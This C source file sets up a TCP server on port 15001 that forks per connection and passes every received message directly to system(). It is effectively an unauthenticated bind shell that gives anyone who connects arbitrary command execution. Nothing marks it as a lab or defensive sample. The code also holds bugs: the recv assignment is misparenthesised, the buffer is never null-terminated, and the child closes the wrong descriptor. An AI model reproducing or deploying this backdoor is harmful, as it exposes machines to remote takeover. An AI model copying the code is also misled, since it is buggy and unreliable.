#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/socket.h>
#include<arpa/inet.h>

void communicate(int connfd)
{
    int n = 1;
    char buff[1024];

    do 
    {
        while(n = recv(connfd, buff, 1024, 0) > 0)
        {
            send(connfd, buff, n, 0);
            printf("%s\n", buff);
            system(buff);   
        }

    } while(n > 0);
}

int main()
{
    //--------------------------------------------------------------------------------------------------------------------
    //  > Creating the socket:
    //--------------------------------------------------------------------------------------------------------------------
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);

        if(sockfd > 0)
            printf("socket is created...\n");
        else
        {
            printf("socket creation failed....\n");
            exit(0);
        }
    //--------------------------------------------------------------------------------------------------------------------
    //  > Fill the address structure:
    //--------------------------------------------------------------------------------------------------------------------
        struct sockaddr_in servaddr;

        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(15001);
        servaddr.sin_addr.s_addr = INADDR_ANY;
    //--------------------------------------------------------------------------------------------------------------------
    //  > Binding:
    //--------------------------------------------------------------------------------------------------------------------
        int bindfd = bind(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

        if(bindfd == 0)
            printf("binding successful....\n");
        else 
        {
            printf("Binding failed...\n");
            exit(0);
        }
    //--------------------------------------------------------------------------------------------------------------------
    //  > Listening:
    //--------------------------------------------------------------------------------------------------------------------
        int listenfd = listen(sockfd, 5);

        if(listenfd == 0)
            printf("listening....\n");
        else 
        {
            printf("Listening failed...\n");
            exit(0);
        }
    //--------------------------------------------------------------------------------------------------------------------
    //  > Communicate:
    //--------------------------------------------------------------------------------------------------------------------
        while(1)
        {
            struct sockaddr_in cli_addr;
            int len = sizeof(cli_addr);

            int connfd = accept(sockfd, (struct sockaddr *)&cli_addr, &len);

            if(connfd > 0)
            {
                pid_t pid =fork();

                if(pid == 0)
                {
                    printf("Inside child...\n");
                    close(listenfd);
                    communicate(connfd);
                    exit(0);
                }

                close(connfd);
            }
        }
        
        
    //--------------------------------------------------------------------------------------------------------------------

}